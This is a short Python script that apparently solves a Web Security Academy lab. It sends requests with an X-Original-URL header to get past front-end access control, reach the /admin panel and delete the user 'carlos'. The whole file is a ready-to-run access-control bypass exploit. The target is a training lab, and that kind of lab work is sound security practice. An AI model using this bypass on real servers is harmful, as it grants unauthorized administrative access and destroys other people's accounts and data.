import requests
from bs4 import BeautifulSoup

site = "0aca002904d0e2ced76be9f300600002.web-security-academy.net/"
s = requests.Session()

# Step 1: Attempt normal access to /admin
url = f'https://{site}/admin'
resp = s.get(url)
print("[*] Attempting direct /admin access...")
if "Access denied" in resp.text:
    print("[!] Access denied as expected.")
else:
    print("[?] Unexpected behavior or already privileged.")

# Step 2: Use X-Original-URL header to bypass restriction
url = f'https://{site}/'
headers = {'X-Original-URL': '/admin'}
resp = s.get(url, headers=headers)
print("[*] Attempting header bypass to access /admin...")
if "Admin panel" in resp.text or "Users" in resp.text:
    print("[✓] Admin panel accessed via X-Original-URL.")
else:
    print("[!] Admin panel access bypass failed.")

# Step 3: Attempt delete using bypass and query param
url = f'https://{site}/?username=carlos'
headers = {'X-Original-URL': '/admin/delete'}
resp = s.get(url, headers=headers)
print("[*] Attempting to delete carlos via bypass...")
if "Congratulations" in resp.text or "User deleted successfully" in resp.text:
    print("[✓] Successfully deleted carlos. Lab solved.")
else:
    print("[!] Delete request sent")
